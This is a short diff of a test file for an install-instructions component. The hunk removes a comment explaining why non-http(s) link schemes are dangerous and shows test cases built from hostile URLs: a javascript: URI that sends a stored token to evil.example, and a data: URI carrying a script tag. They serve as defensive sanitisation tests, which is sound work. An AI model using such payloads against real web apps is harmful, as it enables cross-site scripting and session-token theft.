@@ -21,9 +21,6 @@ describe('InstallInstructions', () => {
     expect(screen.getByRole('link', { name: /download binary/i })).toHaveAttribute('href', 'https://example.com/agent-arm64');
   });
 
-  // The manifest URL is stored verbatim by the publish endpoint and rendered as
-  // an href. A non-http(s) scheme in that field would execute in the app origin
-  // when a user clicks the download link, so it must never reach the anchor.
   it.each([
     ['javascript:', 'javascript:fetch("https://evil.example/"+localStorage.token)'],
     ['data:', 'data:text/html,<script>alert(1)</script>'],
